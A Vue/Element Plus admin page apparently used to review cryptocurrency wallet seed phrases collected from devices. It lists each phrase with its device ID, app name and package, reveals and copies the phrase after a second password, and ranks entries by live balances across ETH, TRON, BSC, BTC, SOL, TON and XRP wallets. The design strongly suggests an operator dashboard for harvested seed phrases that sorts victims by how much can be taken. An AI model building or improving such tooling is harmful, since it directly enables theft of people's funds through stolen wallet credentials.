<template>
  <div class="table-box" v-loading="loading" element-loading-text="加载中...">
    <ProTable
      ref="proTable"
      title="助记词列表"
      row-key="id"
      :columns="columns"
      :request-api="getReceiveWordsListWithLoading"
      :init-param="initParam"
      :data-callback="dataCallback"
      @sort-change="handleSortChange"
      @search="handleSearch"
    >
      <!-- 在搜索表单下方插入统计卡片 -->
      <template #searchFormAfter>
        <!-- 余额统计卡片 -->
        <el-card class="balance-stats-card" shadow="never">
          <template #header>
            <div class="card-header">
              <span>货币余额统计</span>
              <el-button 
                type="primary" 
                link 
                :icon="Refresh" 
                :loading="statsLoading"
                @click="loadBalanceStats"
              >
                刷新
              </el-button>
            </div>
          </template>
          <div class="balance-stats-content" v-loading="statsLoading">
            <div class="stats-grid">
              <div 
                v-for="(balance, currency) in balanceStats" 
                :key="currency"
                class="stat-item"
              >
                <div class="stat-label">{{ getCurrencyLabel(currency) }}</div>
                <div class="stat-value" :class="{ 'stat-value-positive': parseFloat(balance) > 0 }">
                  {{ formatBalance(balance) }}
                </div>
              </div>
              <div v-if="Object.keys(balanceStats).length === 0" class="stat-empty">
                暂无统计数据
              </div>
            </div>
          </div>
        </el-card>
      </template>
      <!-- 设备号内容 -->
      <template #device_number="scope">
        <div class="device-number-text">{{ scope.row.device_number || "-" }}</div>
      </template>
      <!-- 助记词内容 -->
      <template #words="scope">
        <div class="words-text">
          {{ verifiedRows.has(scope.row.id) ? (scope.row.words || "-") : "***" }}
        </div>
      </template>
      <!-- 操作 -->
      <template #operation="scope">
        <el-button 
          v-if="!verifiedRows.has(scope.row.id)"
          type="primary" 
          link 
          :icon="View" 
          @click="handleView(scope.row)"
        >
          查看
        </el-button>
        <el-button 
          v-else
          type="primary" 
          link 
          :icon="CopyDocument" 
          @click="handleCopy(scope.row)"
        >
          复制
        </el-button>
      </template>
    </ProTable>
    <!-- 二次密码验证弹窗 -->
    <el-dialog v-model="passwordDialogVisible" title="二次密码验证" width="400px">
      <el-form :model="passwordForm" :rules="passwordRules" ref="passwordFormRef" label-width="100px">
        <el-form-item label="二次密码" prop="password">
          <el-input
            v-model="passwordForm.password"
            type="password"
            placeholder="请输入二次密码"
            show-password
            @keyup.enter="handleVerifyPassword"
          />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="passwordDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="verifying" @click="handleVerifyPassword">确定</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts" name="receiveWords">
import { ref, reactive, h, onMounted } from "vue";
import type { FormInstance, FormRules } from "element-plus";
import { ColumnProps, ProTableInstance } from "@/components/ProTable/interface";
import { View, CopyDocument, Refresh } from "@element-plus/icons-vue";
import { ElLink } from "element-plus";
import ProTable from "@/components/ProTable/index.vue";
import {
  getReceiveWordsListApi,
  getReceiveWordsInfoApi,
  getBalanceStatsApi,
  ReceiveWordsItem,
  ReceiveWordsListResponse,
  BalanceStatsResponse
} from "@/api/modules/receiveWords";
import { verifySecondPasswordApi } from "@/api/modules/login";
import { ElMessage } from "element-plus";

const proTable = ref<ProTableInstance>();
const loading = ref(false);
const passwordDialogVisible = ref(false);
const verifying = ref(false);
const passwordFormRef = ref<FormInstance>();
const currentRow = ref<ReceiveWordsItem | null>(null);
const verifiedRows = ref<Set<number>>(new Set());

// 余额统计相关
const balanceStats = ref<BalanceStatsResponse>({});
const statsLoading = ref(false);

const passwordForm = reactive({
  password: ""
});

const passwordRules = reactive<FormRules>({
  password: [{ required: true, message: "请输入二次密码", trigger: "blur" }]
});

// 初始化参数
const initParam = reactive({
  page: 1,
  limit: 20
});

// 排序参数
const sortParam = reactive({
  prop: '',
  order: ''
});

// 处理排序变化（通过 ProTable 的 element 访问 el-table）
const handleSortChange = ({ prop, order }: { prop: string; order: string }) => {
  sortParam.prop = prop || '';
  sortParam.order = order || '';
  // 触发重新加载数据
  if (proTable.value) {
    proTable.value.getTableList();
  }
};

// 处理搜索事件 - 搜索时刷新余额统计
const handleSearch = () => {
  loadBalanceStats();
};

// 带加载状态的助记词列表请求
const getReceiveWordsListWithLoading = async (params?: any) => {
  loading.value = true;
  try {
    // 合并排序参数
    const requestParams = {
      ...params,
      prop: sortParam.prop || params?.prop || '',
      order: sortParam.order || params?.order || ''
    };
    const result = await getReceiveWordsListApi(requestParams);
    // 移除自动刷新统计数据，避免重复调用（已在onMounted中调用）
    return result;
  } finally {
    loading.value = false;
  }
};

// 数据回调处理
const dataCallback = (data: ReceiveWordsListResponse) => {
  return {
    list: data.list || [],
    total: data.total_num || 0
  };
};

// 表格配置项
const columns = reactive<ColumnProps<ReceiveWordsItem>[]>([
  { prop: "id", label: "ID", width: 60 },
  { 
    prop: "device_id", 
    label: "设备ID", 
    width: 80,
    search: { el: "input", props: { placeholder: "请输入设备ID" } } 
  },
  { 
    prop: "device_number", 
    label: "设备号", 
    minWidth: 120, 
    showOverflowTooltip: false,
    search: { el: "input", props: { placeholder: "请输入设备号" } } 
  },
  { 
    prop: "app_name", 
    label: "APP名称", 
    width: 130, 
    search: { el: "input", props: { placeholder: "请输入APP名称" } } 
  },
  { 
    prop: "app_package", 
    label: "APP包名", 
    width: 180, 
    search: { el: "input", props: { placeholder: "请输入APP包名" } } 
  },
  { 
    prop: "words", 
    label: "助记词", 
    minWidth: 180,
    showOverflowTooltip: false
  },
  { 
    prop: "assets", 
    label: "资产", 
    minWidth: 400,
    showOverflowTooltip: false,
    sortable: "custom",
    render: (scope) => {
      const row = scope.row;
      
      // 定义货币配置（按指定顺序排列）
      const currencies = [
        // 第一行：ERC 2个
        {
          name: "ERC",
          address: row.wallet_address_eth,
          balance: row.wallet_balance_eth,
          getUrl: getEthExplorerUrl
        },
        {
          name: "ERC20 USDT",
          address: row.wallet_address_eth,
          balance: row.wallet_balance_eth_usdt,
          getUrl: getEthExplorerUrl
        },
        // 第二行：TRON 2个
        {
          name: "Tron",
          address: row.wallet_address_tron,
          balance: row.wallet_balance_tron,
          getUrl: getTronExplorerUrl
        },
        {
          name: "TRON USDT",
          address: row.wallet_address_tron,
          balance: row.wallet_balance_tron_usdt,
          getUrl: getTronExplorerUrl
        },
        // 第三行：BSC 2个
        {
          name: "BSC",
          address: row.wallet_address_bsc,
          balance: row.wallet_balance_bsc,
          getUrl: getBscExplorerUrl
        },
        {
          name: "BSC20 USDT",
          address: row.wallet_address_bsc,
          balance: row.wallet_balance_bsc_usdt,
          getUrl: getBscExplorerUrl
        },
        // 其他的放后面
        {
          name: "BTC",
          address: row.wallet_address_btc,
          balance: row.wallet_balance_btc,
          getUrl: getBtcExplorerUrl
        },
        {
          name: "SOL",
          address: row.wallet_address_sol,
          balance: row.wallet_balance_sol,
          getUrl: getSolExplorerUrl
        },
        {
          name: "TON",
          address: row.wallet_address_ton,
          balance: row.wallet_balance_ton,
          getUrl: getTonExplorerUrl
        },
        {
          name: "XRP",
          address: row.wallet_address_xrp,
          balance: row.wallet_balance_xrp,
          getUrl: getXrpExplorerUrl
        }
      ];
      
      // 创建表格行（每行显示2个货币）
      const tableRows: any[] = [];
      
      // 将货币按每2个一组分组
      for (let i = 0; i < currencies.length; i += 2) {
        const currency1 = currencies[i];
        const currency2 = currencies[i + 1];
        const rowIndex = Math.floor(i / 2);
        const isEvenRow = rowIndex % 2 === 0;
        const rowBgColor = isEvenRow ? "#ffffff" : "#f0f2f5";
        
        // 处理第一个货币
        const processCurrency = (currency: any, isFirst: boolean) => {
          const nameCell = currency.address
            ? h(ElLink, {
                type: "primary",
                href: currency.getUrl(currency.address),
                target: "_blank"
              }, { default: () => currency.name })
            : h("span", { class: "asset-name-disabled" }, currency.name);
          
          // 处理余额显示
          let balanceText = "-";
          let isPositive = false; // 标识余额是否大于0
          
          // 如果余额为 null 或 undefined，显示 "-"
          if (currency.balance === null || currency.balance === undefined) {
            balanceText = "-";
          } else if (currency.balance === '') {
            // 空字符串也显示 "-"
            balanceText = "-";
          } else if (currency.balance === 0 || currency.balance === '0') {
            // 如果余额是 0（数字或字符串），正常显示 "0"
            balanceText = "0";
          } else {
            // 处理其他情况
            let balanceParts: string[] = [];
            
            if (typeof currency.balance === 'number') {
              balanceParts = [currency.balance.toString()];
            } else if (typeof currency.balance === 'string') {
              balanceParts = currency.balance.split(',').map(part => part.trim()).filter(part => part);
            }
            
            if (balanceParts.length > 0) {
              const part = balanceParts[0]; // 只取第一个余额值
              if (!isNaN(Number(part)) && part !== '') {
                const numValue = Number(part);
                if (numValue > 0) {
                  isPositive = true;
                  if (numValue < 0.01) {
                    balanceText = numValue.toFixed(8).replace(/\.?0+$/, '');
                  } else if (numValue < 1) {
                    balanceText = numValue.toFixed(6).replace(/\.?0+$/, '');
                  } else {
                    balanceText = numValue.toFixed(2).replace(/\.?0+$/, '');
                  }
                } else if (numValue === 0) {
                  // 数字为 0，正常显示
                  balanceText = "0";
                } else {
                  // 负数或其他情况，显示原值
                  balanceText = part;
                }
              } else {
                balanceText = part;
              }
            }
          }
          
          return {
            nameCell,
            balanceText,
            hasBalance: balanceText !== "-",
            isPositive: isPositive
          };
        };
        
        const currency1Data = processCurrency(currency1, true);
        const currency2Data = currency2 ? processCurrency(currency2, false) : null;
        
        // 创建表格行，包含2个货币
        const cells: any[] = [];
        
        // 第一个货币
        cells.push(
          h("td", { 
            class: "asset-name-cell",
            style: {
              padding: "1px 4px",
              width: "90px",
              minWidth: "90px",
              maxWidth: "90px",
              whiteSpace: "nowrap",
              fontWeight: "600",
              verticalAlign: "middle",
              backgroundColor: rowBgColor,
              borderRight: "1px solid #dcdfe6",
              fontSize: "11px"
            }
          }, currency1Data.nameCell),
          h("td", { 
            class: "asset-balance-cell",
            style: { 
              textAlign: "left",
              padding: "1px 4px",
              width: "90px",
              minWidth: "90px",
              verticalAlign: "middle",
              backgroundColor: rowBgColor,
              borderRight: currency2 ? "1px solid #dcdfe6" : "none"
            }
          }, h("span", { 
            class: currency1Data.hasBalance 
              ? (currency1Data.isPositive ? "asset-balance asset-balance-positive" : "asset-balance")
              : "asset-balance-empty",
            style: currency1Data.isPositive ? { color: "#f56c6c" } : {}
          }, currency1Data.balanceText))
        );
        
        // 第二个货币（如果存在）
        if (currency2Data) {
          cells.push(
            h("td", { 
              class: "asset-name-cell",
              style: {
                padding: "1px 4px",
                width: "90px",
                minWidth: "90px",
                maxWidth: "90px",
                whiteSpace: "nowrap",
                fontWeight: "600",
                verticalAlign: "middle",
                backgroundColor: rowBgColor,
                borderRight: "1px solid #dcdfe6",
                fontSize: "11px"
              }
            }, currency2Data.nameCell),
            h("td", { 
              class: "asset-balance-cell",
              style: { 
                textAlign: "left",
                padding: "1px 4px",
                width: "90px",
                minWidth: "90px",
                verticalAlign: "middle",
                backgroundColor: rowBgColor
              }
            }, h("span", { 
              class: currency2Data.hasBalance 
                ? (currency2Data.isPositive ? "asset-balance asset-balance-positive" : "asset-balance")
                : "asset-balance-empty",
              style: currency2Data.isPositive ? { color: "#f56c6c" } : {}
            }, currency2Data.balanceText))
          );
        }
        
        tableRows.push(
          h("tr", { 
            class: "asset-table-row",
            style: {
              backgroundColor: rowBgColor
            }
          }, cells)
        );
      }
      
      return h("table", { 
        class: "assets-table",
        style: {
          border: "1px solid #dcdfe6",
          borderRadius: "4px",
          borderCollapse: "separate",
          borderSpacing: "0",
          tableLayout: "fixed",
          width: "100%"
        }
      }, [
        h("colgroup", [
          h("col", { style: { width: "90px" } }),
          h("col", { style: { width: "90px" } }),
          h("col", { style: { width: "90px" } }),
          h("col", { style: { width: "90px" } })
        ]),
        h("tbody", tableRows)
      ]);
    }
  },
  { prop: "created_at", label: "创建时间", width: 180 },
  { prop: "operation", label: "操作", width: 120, fixed: "right" }
]);

// 处理查看按钮点击
const handleView = (row: ReceiveWordsItem) => {
  currentRow.value = row;
  passwordForm.password = "";
  passwordDialogVisible.value = true;
};

// 复制助记词
const handleCopy = async (row: ReceiveWordsItem) => {
  const words = row.words || "";
  if (!words) {
    ElMessage.warning("助记词为空");
    return;
  }
  
  try {
    await navigator.clipboard.writeText(words);
    ElMessage.success("复制成功");
  } catch (err) {
    // 降级方案：使用传统方法
    const textArea = document.createElement("textarea");
    textArea.value = words;
    textArea.style.position = "fixed";
    textArea.style.left = "-999999px";
    textArea.style.top = "-999999px";
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    try {
      document.execCommand("copy");
      ElMessage.success("复制成功");
    } catch (err) {
      ElMessage.error("复制失败，请手动复制");
    }
    document.body.removeChild(textArea);
  }
};

// 验证二次密码
const handleVerifyPassword = async () => {
  // 防止重复点击
  if (verifying.value) return;
  
  if (!passwordFormRef.value) return;
  
  try {
    // 先进行表单验证
    await passwordFormRef.value.validate();
    
    // 验证通过后，设置加载状态
    verifying.value = true;
    
    try {
      await verifySecondPasswordApi({ password: passwordForm.password });
      // 验证成功，重新获取该行的详细数据
      if (currentRow.value) {
        try {
          const res = await getReceiveWordsInfoApi(currentRow.value.id);
          const updatedData = (res as any)?.data || res;
          // 更新表格中该行的数据
          if (proTable.value) {
            const tableData = proTable.value.tableData || [];
            const index = tableData.findIndex((item: ReceiveWordsItem) => item.id === currentRow.value!.id);
            if (index !== -1 && updatedData) {
              // 更新该行的数据
              Object.assign(tableData[index], updatedData);
              verifiedRows.value.add(currentRow.value.id);
            }
          }
        } catch (error) {
          console.error("获取助记词详情失败:", error);
        }
      }
      passwordDialogVisible.value = false;
      passwordForm.password = "";
      ElMessage.success("验证成功");
    } catch (error) {
      // 错误信息已由HTTP拦截器统一处理，这里不需要再次提示
    } finally {
      verifying.value = false;
    }
  } catch (error) {
    // 表单验证失败，不需要处理，Element Plus会自动显示错误信息
    // 确保verifying状态被重置（虽然此时应该是false，但为了安全起见）
    verifying.value = false;
  }
};

// 获取BTC区块链浏览器链接
const getBtcExplorerUrl = (address: string) => {
  return `https://mempool.space/address/${address}`;
};
// 获取ETH/ERC区块链浏览器链接
const getEthExplorerUrl = (address: string) => {
  return `https://etherscan.io/address/${address}`;
};
// 获取BSC区块链浏览器链接
const getBscExplorerUrl = (address: string) => {
  return `https://bscscan.com/address/${address}`;
};
// 获取TRON区块链浏览器链接
const getTronExplorerUrl = (address: string) => {
  return `https://tronscan.org/#/address/${address}`;
};
// 获取SOL区块链浏览器链接
const getSolExplorerUrl = (address: string) => {
  return `https://solscan.io/account/${address}`;
};
// 获取TON区块链浏览器链接
const getTonExplorerUrl = (address: string) => {
  return `https://tonscan.org/address/${address}`;
};
// 获取XRP区块链浏览器链接
const getXrpExplorerUrl = (address: string) => {
  return `https://xrpscan.com/account/${address}`;
};

// 币种标签映射
const getCurrencyLabel = (currency: string): string => {
  const labelMap: Record<string, string> = {
    'BTC': 'BTC',
    'ETH': 'ETH',
    'BSC': 'BSC',
    'TRON': 'TRON',
    'SOL': 'SOL',
    'TON': 'TON',
    'XRP': 'XRP',
    'ERC20USDT': 'ERC20 USDT',
    'BEP20USDT': 'BEP20 USDT',
    'TRC20USDT': 'TRC20 USDT'
  };
  return labelMap[currency] || currency;
};

// 格式化余额显示
const formatBalance = (balance: string): string => {
  if (!balance || balance === '0' || balance === '') {
    return '0';
  }
  
  const numValue = parseFloat(balance);
  if (isNaN(numValue)) {
    return balance;
  }
  
  if (numValue === 0) {
    return '0';
  }
  
  // 根据数值大小选择不同的精度
  if (numValue < 0.01) {
    return numValue.toFixed(8).replace(/\.?0+$/, '');
  } else if (numValue < 1) {
    return numValue.toFixed(6).replace(/\.?0+$/, '');
  } else {
    return numValue.toFixed(2).replace(/\.?0+$/, '');
  }
};

// 加载余额统计
const loadBalanceStats = async () => {
  statsLoading.value = true;
  try {
    const res = await getBalanceStatsApi();
    const data = (res as any)?.data || res;
    balanceStats.value = data || {};
  } catch (error) {
    console.error('加载余额统计失败:', error);
    ElMessage.error('加载余额统计失败');
  } finally {
    statsLoading.value = false;
  }
};

// 页面加载时获取统计数据
onMounted(() => {
  loadBalanceStats();
});
</script>
<style scoped lang="scss">
.device-number-text {
  word-break: break-all;
  white-space: normal;
  line-height: 1.5;
}

.words-text {
  word-break: break-all;
  white-space: normal;
  line-height: 1.5;
}

.balance-stats-card {
  margin-bottom: 12px;
  
  :deep(.el-card__header) {
    padding: 8px 12px;
    border-bottom: 1px solid #ebeef5;
  }
  
  :deep(.el-card__body) {
    padding: 8px 12px;
  }
  
  .card-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-weight: 600;
    font-size: 13px;
  }
  
  .balance-stats-content {
    min-height: 40px;
  }
  
  .stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
    gap: 8px;
    
    .stat-item {
      padding: 6px 8px;
      background-color: #f5f7fa;
      border-radius: 3px;
      border: 1px solid #e4e7ed;
      transition: all 0.2s;
      
      &:hover {
        background-color: #ecf5ff;
        border-color: #b3d8ff;
      }
      
      .stat-label {
        font-size: 11px;
        color: #909399;
        margin-bottom: 4px;
        font-weight: 500;
        line-height: 1.2;
      }
      
      .stat-value {
        font-size: 14px;
        font-weight: 600;
        color: #303133;
        font-family: 'SF Mono', 'Monaco', 'Consolas', 'Courier New', monospace;
        line-height: 1.2;
        
        &.stat-value-positive {
          color: #f56c6c;
        }
      }
    }
    
    .stat-empty {
      grid-column: 1 / -1;
      text-align: center;
      padding: 12px;
      color: #909399;
      font-size: 12px;
    }
  }
}

.assets-table {
  width: 100% !important;
  border-collapse: collapse !important;
  border-spacing: 0 !important;
  font-size: 11px !important;
  text-align: left !important;
  background-color: transparent !important;
  border: 1px solid #dcdfe6 !important;
  border-radius: 3px !important;
  overflow: hidden !important;
  margin: 0 !important;
  table-layout: fixed !important;
  
  td {
    background-color: inherit !important;
    vertical-align: middle !important;
    
    &:hover {
      background-color: inherit !important;
    }
  }
  
  .asset-table-row {
    // 奇数行背景色 - 白色
    &:nth-child(odd) {
      background-color: #ffffff !important;
      
      td {
        background-color: #ffffff !important;
      }
      
      .asset-name-cell,
      .asset-balance-cell {
        background-color: #ffffff !important;
      }
    }
    
    // 偶数行背景色 - 使用更明显的灰色
    &:nth-child(even) {
      background-color: #f0f2f5 !important;
      
      td {
        background-color: #f0f2f5 !important;
      }
      
      .asset-name-cell,
      .asset-balance-cell {
        background-color: #f0f2f5 !important;
      }
    }
    
    &:hover {
      background-color: #e1f3ff !important;
      
      td {
        background-color: #e1f3ff !important;
      }
      
      .asset-name-cell,
      .asset-balance-cell {
        background-color: #e1f3ff !important;
      }
    }
    
    // 所有行（除了最后一行）显示底边框
    &:not(:last-child) {
      td {
        border-bottom: 1px solid #dcdfe6 !important;
      }
    }
    
    // 最后一行：不显示底边框
    &:last-child {
      td {
        border-bottom: none !important;
      }
    }
    
    .asset-name-cell {
      padding: 1px 4px !important;
      width: 90px !important;
      min-width: 90px !important;
      max-width: 90px !important;
      white-space: nowrap !important;
      font-weight: 600 !important;
      vertical-align: middle !important;
      font-size: 11px !important;
      overflow: hidden !important;
      text-overflow: ellipsis !important;
      
      .asset-name-disabled {
        color: #909399 !important;
        font-weight: 500 !important;
      }
    }
    
    .asset-balance-cell {
      padding: 1px 4px !important;
      text-align: left !important;
      vertical-align: middle !important;
      width: 90px !important;
      min-width: 90px !important;
      overflow: hidden !important;
      
      .asset-balance {
        color: #303133 !important;
        text-align: left !important;
        display: inline-block !important;
        width: 100% !important;
        font-family: 'SF Mono', 'Monaco', 'Consolas', 'Courier New', monospace !important;
        font-size: 10.5px !important;
        overflow: hidden !important;
        text-overflow: ellipsis !important;
        white-space: nowrap !important;
      }
      
      .asset-balance-positive {
        color: #f56c6c !important;
        font-weight: 600 !important;
      }
      
      .asset-balance-empty {
        color: #c0c4cc !important;
        text-align: left !important;
        display: inline-block !important;
        width: 100% !important;
        overflow: hidden !important;
        text-overflow: ellipsis !important;
        white-space: nowrap !important;
      }
    }
  }
}
</style>

